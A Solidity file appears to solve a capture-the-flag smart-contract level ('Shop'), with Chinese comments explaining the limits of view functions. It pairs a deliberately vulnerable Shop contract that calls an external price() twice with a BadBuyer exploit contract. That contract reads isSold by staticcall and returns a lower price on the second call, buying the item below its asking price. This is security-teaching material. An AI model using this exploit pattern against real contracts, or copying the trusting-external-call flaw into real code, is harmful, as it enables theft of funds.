// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Buyer {
    function price() external view returns (uint256);
}

/**
 * 您能在商店以低于要求的价格购买到商品吗？
 * 1.shop合约预计由买家使用
 * 2.了解view函数的限制
 *
 * 解题关键：view函数中可以调用staticcall，不会改变状态，所谓修改状态，是指以下8种情况：
 * 1.写状态变量
 * 2.触发事件(emit events)
 * 3.创建其他合约
 * 4.使用selfdestruct
 * 5.通过call发送以太币
 * 6.使用call调用任何没有被标记为view或者pure的函数
 * 7.使用低级的call
 * 8.使用包含opcode的内联汇编
 */
contract Shop {
    uint256 public price = 100;
    bool public isSold;

    function buy() public {
        Buyer _buyer = Buyer(msg.sender);

        if (_buyer.price() >= price && !isSold) {
            isSold = true;
            price = _buyer.price();
        }
    }
}

contract BadBuyer is Buyer {

    address public shop;

    constructor(address _shop) {
        shop = _shop;
    }

    function price() external view override returns (uint256) {
        uint256 priceNum = 101;
        bytes memory res;
        (, res) = shop.staticcall(abi.encodeWithSignature("isSold()"));
        if (uint8(res[31]) == 1) {
            priceNum = 1;
        }
        return priceNum;
    }

    function buy() public {
        Shop(shop).buy();
    }
}
